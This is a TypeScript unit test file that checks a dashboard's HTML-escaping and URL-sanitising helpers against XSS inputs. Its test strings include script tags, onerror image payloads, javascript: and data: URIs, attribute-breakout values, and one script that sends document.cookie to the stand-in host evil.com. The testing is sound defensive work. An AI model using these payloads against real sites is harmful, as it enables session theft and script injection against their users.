/**
 * Tests for the HTML escaping and URL sanitization helpers used in dashboard.js.
 *
 * The functions are duplicated here from the IIFE closure for unit testing.
 * The logic is intentionally identical to web/js/dashboard.js lines 608-623.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { Window } from "happy-dom";

let document: Document;

beforeAll(() => {
  const win = new Window();
  document = win.document as unknown as Document;
});

afterAll(() => {
  // happy-dom cleanup
});

function escapeHtml(str: string): string {
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}

function escapeAttr(str: string): string {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function safeHref(url: string): string {
  const s = String(url || "").trim();
  if (/^javascript\s*:/i.test(s)) return "#";
  if (!/^https?:\/\//i.test(s)) return "#";
  return escapeAttr(s);
}

describe("escapeHtml", () => {
  it("should escape < and > characters", () => {
    expect(escapeHtml("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("should escape & character", () => {
    expect(escapeHtml("foo & bar")).toBe("foo &amp; bar");
  });

  it("should preserve double quotes (textContent does not escape them)", () => {
    // textContent only escapes <, >, & — quotes are preserved. That's fine for
    // text nodes inside elements (not in attributes). Attribute escaping uses escapeAttr.
    expect(escapeHtml('"hello"')).toBe('"hello"');
  });

  it("should leave plain text unchanged", () => {
    expect(escapeHtml("hello world")).toBe("hello world");
  });

  it("should handle empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  it("should escape HTML entities in externalId", () => {
    const maliciousId = '<img src=x onerror=alert(1)>';
    expect(escapeHtml(maliciousId)).not.toContain("<img");
    expect(escapeHtml(maliciousId)).toContain("&lt;img");
    // The tag is neutralized — angle brackets are escaped so the browser treats it as text
    expect(escapeHtml(maliciousId)).toContain("&lt;img");
  });
});

describe("escapeAttr", () => {
  it("should escape double quotes", () => {
    expect(escapeAttr('value"onclick="alert(1)')).toContain("&quot;");
    expect(escapeAttr('value"onclick="alert(1)')).not.toMatch(/"[^q]/);
  });

  it("should escape angle brackets", () => {
    expect(escapeAttr("<script>")).toBe("&lt;script&gt;");
  });

  it("should escape ampersands", () => {
    expect(escapeAttr("a&b")).toBe("a&amp;b");
  });

  it("should handle platform names safely", () => {
    expect(escapeAttr('github"onmouseover="alert(1)')).toContain("&quot;");
  });
});

describe("safeHref", () => {
  it("should block javascript: URI scheme", () => {
    expect(safeHref("javascript:alert(1)")).toBe("#");
  });

  it("should block javascript: URI with whitespace", () => {
    expect(safeHref("  javascript:alert(1)  ")).toBe("#");
  });

  it("should block javascript: with mixed case", () => {
    expect(safeHref("JaVaScRiPt:alert(1)")).toBe("#");
  });

  it("should block javascript: with tabs/spaces after colon", () => {
    expect(safeHref("javascript\t:alert(1)")).toBe("#");
  });

  it("should block data: URIs", () => {
    expect(safeHref("data:text/html,<script>alert(1)</script>")).toBe("#");
  });

  it("should block empty strings", () => {
    expect(safeHref("")).toBe("#");
  });

  it("should block relative URLs", () => {
    expect(safeHref("/path/to/page")).toBe("#");
  });

  it("should allow http:// URLs", () => {
    const result = safeHref("http://example.com/issue/1");
    expect(result).toContain("http://example.com");
    expect(result).not.toBe("#");
  });

  it("should allow https:// URLs", () => {
    const result = safeHref("https://github.com/org/repo/issues/42");
    expect(result).toContain("https://github.com");
    expect(result).not.toBe("#");
  });

  it("should escape special chars in valid URLs", () => {
    const result = safeHref('https://example.com/path?q=1&p=2"onclick="alert(1)');
    expect(result).toContain("&quot;");
  });

  it("should handle null/undefined gracefully", () => {
    expect(safeHref(null as any)).toBe("#");
    expect(safeHref(undefined as any)).toBe("#");
  });
});

describe("board card XSS prevention", () => {
  it("should not allow script injection through externalId", () => {
    const maliciousId = '<img src=x onerror="alert(1)">';
    const escaped = escapeHtml(maliciousId);
    // Angle brackets are escaped — the img tag is inert text, not HTML
    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&lt;img");
    // The text "onerror" appears literally but is harmless without a live <img> element
    expect(escaped).toContain("onerror");
  });

  it("should not allow script injection through url", () => {
    const maliciousUrl = "javascript:void(document.cookie)";
    const href = safeHref(maliciousUrl);
    expect(href).toBe("#");
  });

  it("should not allow script injection through assignee", () => {
    const maliciousAssignee = '<script>document.location="http://evil.com?c="+document.cookie</script>';
    const escaped = escapeHtml(maliciousAssignee);
    expect(escaped).not.toContain("<script>");
  });

  it("should not allow event handler injection through labels", () => {
    const maliciousLabel = '"><img src=x onerror=alert(1)>';
    const escaped = escapeHtml(maliciousLabel);
    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&gt;");
  });

  it("should not allow attribute breakout through platform name", () => {
    const maliciousPlatform = 'github" onclick="alert(1)';
    const escaped = escapeAttr(maliciousPlatform);
    expect(escaped).not.toMatch(/"[^q]/);
    expect(escaped).toContain("&quot;");
  });

  it("should safely render a normal issue card", () => {
    const normalIssue = {
      url: "https://github.com/org/repo/issues/1",
      externalId: "#1",
      platform: "github",
      title: "Fix the bug",
      assignee: "dev@example.com",
      labels: ["bug", "priority: high"],
    };

    const href = safeHref(normalIssue.url);
    const id = escapeHtml(normalIssue.externalId);
    const title = escapeHtml(normalIssue.title);
    const assignee = escapeHtml(normalIssue.assignee);
    const platform = escapeAttr(normalIssue.platform);

    expect(href).toBe("https://github.com/org/repo/issues/1");
    expect(id).toBe("#1");
    expect(title).toBe("Fix the bug");
    expect(assignee).toBe("dev@example.com");
    expect(platform).toBe("github");
  });
});
